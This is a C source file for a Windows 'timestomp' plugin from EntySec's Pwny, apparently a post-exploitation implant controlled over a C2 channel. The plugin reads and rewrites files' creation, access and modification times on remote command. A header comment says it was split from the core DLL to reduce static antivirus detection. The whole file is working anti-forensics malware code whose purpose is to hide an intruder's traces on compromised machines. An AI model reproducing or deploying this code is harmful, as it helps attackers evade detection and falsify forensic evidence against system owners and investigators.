/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Timestomp tab plugin — file timestamp manipulation.
 *
 * Moved out of the core DLL to reduce the static detection
 * surface. Loaded on demand as a tab DLL via pe_load().
 */

#ifdef __windows__

#include <pwny/tab_dll.h>

#include <windows.h>
#include <string.h>
#include <pwny/c2.h>
#include <pwny/log.h>

#define TIMESTOMP_BASE 22

#define TIMESTOMP_SET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TIMESTOMP_BASE, \
                       API_CALL)

#define TIMESTOMP_GET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TIMESTOMP_BASE, \
                       API_CALL + 1)

#define TLV_TYPE_TS_PATH   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TIMESTOMP_BASE, API_TYPE)
#define TLV_TYPE_TS_MTIME  TLV_TYPE_CUSTOM(TLV_TYPE_INT, TIMESTOMP_BASE, API_TYPE)
#define TLV_TYPE_TS_ATIME  TLV_TYPE_CUSTOM(TLV_TYPE_INT, TIMESTOMP_BASE, API_TYPE + 1)
#define TLV_TYPE_TS_CTIME  TLV_TYPE_CUSTOM(TLV_TYPE_INT, TIMESTOMP_BASE, API_TYPE + 2)

static void unix_to_filetime(int64_t unix_time, FILETIME *ft)
{
    ULARGE_INTEGER ull;
    ull.QuadPart = ((ULONGLONG)unix_time + 11644473600ULL) * 10000000ULL;
    ft->dwLowDateTime = ull.LowPart;
    ft->dwHighDateTime = ull.HighPart;
}

static int64_t filetime_to_unix(const FILETIME *ft)
{
    ULARGE_INTEGER ull;
    ull.LowPart = ft->dwLowDateTime;
    ull.HighPart = ft->dwHighDateTime;
    return (int64_t)(ull.QuadPart / 10000000ULL - 11644473600ULL);
}

static tlv_pkt_t *timestomp_get(c2_t *c2)
{
    char path[1024];
    HANDLE hFile;
    FILETIME ftCreate, ftAccess, ftWrite;
    tlv_pkt_t *result;

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_TS_PATH, path) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        log_debug("* timestomp_get: CreateFile failed (%lu)\n", GetLastError());
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!GetFileTime(hFile, &ftCreate, &ftAccess, &ftWrite))
    {
        log_debug("* timestomp_get: GetFileTime failed (%lu)\n", GetLastError());
        CloseHandle(hFile);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    CloseHandle(hFile);

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_u32(result, TLV_TYPE_TS_MTIME, (int32_t)filetime_to_unix(&ftWrite));
    tlv_pkt_add_u32(result, TLV_TYPE_TS_ATIME, (int32_t)filetime_to_unix(&ftAccess));
    tlv_pkt_add_u32(result, TLV_TYPE_TS_CTIME, (int32_t)filetime_to_unix(&ftCreate));

    return result;
}

static tlv_pkt_t *timestomp_set(c2_t *c2)
{
    char path[1024];
    HANDLE hFile;
    FILETIME ftCreate, ftAccess, ftWrite;
    FILETIME *pftCreate = NULL;
    FILETIME *pftAccess = NULL;
    FILETIME *pftWrite = NULL;
    int32_t mtime, atime, ctime;

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_TS_PATH, path) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    hFile = CreateFileA(path, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        log_debug("* timestomp_set: CreateFile failed (%lu)\n", GetLastError());
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_TS_MTIME, &mtime) == 0)
    {
        unix_to_filetime((int64_t)mtime, &ftWrite);
        pftWrite = &ftWrite;
    }

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_TS_ATIME, &atime) == 0)
    {
        unix_to_filetime((int64_t)atime, &ftAccess);
        pftAccess = &ftAccess;
    }

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_TS_CTIME, &ctime) == 0)
    {
        unix_to_filetime((int64_t)ctime, &ftCreate);
        pftCreate = &ftCreate;
    }

    if (!SetFileTime(hFile, pftCreate, pftAccess, pftWrite))
    {
        log_debug("* timestomp_set: SetFileTime failed (%lu)\n", GetLastError());
        CloseHandle(hFile);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    CloseHandle(hFile);

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

TAB_DLL_EXPORT void TabInit(api_calls_t **api_calls)
{
    api_call_register(api_calls, TIMESTOMP_SET, (api_t)timestomp_set);
    api_call_register(api_calls, TIMESTOMP_GET, (api_t)timestomp_get);
}

#endif
